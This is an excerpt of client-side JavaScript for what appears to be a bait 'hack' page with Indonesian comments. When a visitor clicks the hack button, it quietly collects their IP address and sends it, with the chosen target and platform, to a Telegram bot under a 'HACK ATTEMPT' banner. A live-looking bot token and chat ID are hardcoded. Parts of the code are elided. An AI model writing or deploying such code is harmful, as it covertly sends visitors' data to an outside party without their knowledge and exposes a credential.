...
// === TELEGRAM CONFIG ===
const TELEGRAM_BOT_TOKEN = '7820001094:AAF-rPc1zpfENUxwN_RB20a1tKAXC3BlCRM';
const TELEGRAM_CHAT_ID = '6263094642';
...
async function getIPAddress() {
    try {
        ...
        return 'IP_TIDAK_DIKETAHUI';
    }
}

async function sendToTelegram(ip, target, platform) {
    const message = `🚨 HACK ATTEMPT 🚨
...
function setupButtons() {
    ...
    document.getElementById('hackBtn').addEventListener('click', async function() {
        ...
        // IP LOGGER: Ambil dan kirim IP
        console.log('📡 Mengambil IP address...');
        const ip = await getIPAddress();
        console.log('✅ IP Address:', ip);
        
        // Kirim ke Telegram
        const sent = await sendToTelegram(ip, currentTarget, currentService);
        if (sent) {
